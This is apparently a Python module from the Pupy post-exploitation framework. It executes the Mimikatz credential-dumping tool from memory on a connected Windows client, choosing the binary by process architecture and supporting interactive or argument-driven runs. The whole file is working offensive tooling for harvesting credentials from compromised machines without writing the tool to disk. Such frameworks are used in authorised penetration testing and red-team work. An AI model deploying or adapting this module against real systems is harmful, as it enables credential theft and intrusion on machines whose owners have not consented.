# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.utils.pe import get_pe_arch
from pupylib.PupyErrors import PupyModuleError
from pupylib.utils.rpyc_utils import redirected_stdio
import time
from modules.memory_exec import MemoryExec
import os.path
__class_name__="Mimikatz"

@compatibility("windows")
class Mimikatz(MemoryExec):
	""" 
		execute mimikatz from memory
	"""
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="mimikatz", description=self.__doc__)
		self.arg_parser.add_argument('args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')


	def run(self, args):
		proc_arch=self.client.desc["proc_arch"]
		mimikatz_path=None
		if "64" in proc_arch:
			mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_x64")
		else:
			mimikatz_path=self.client.pupsrv.config.get("mimikatz","exe_Win32")
		if not os.path.isfile(mimikatz_path):
			self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
			return

		mimikatz_args=args.args
		interactive=False
		timeout=None
		if not mimikatz_args:
			interactive=True
			timeout=10

		self.exec_pe(mimikatz_path, mimikatz_args, interactive=interactive, fork=False, timeout=timeout)
				

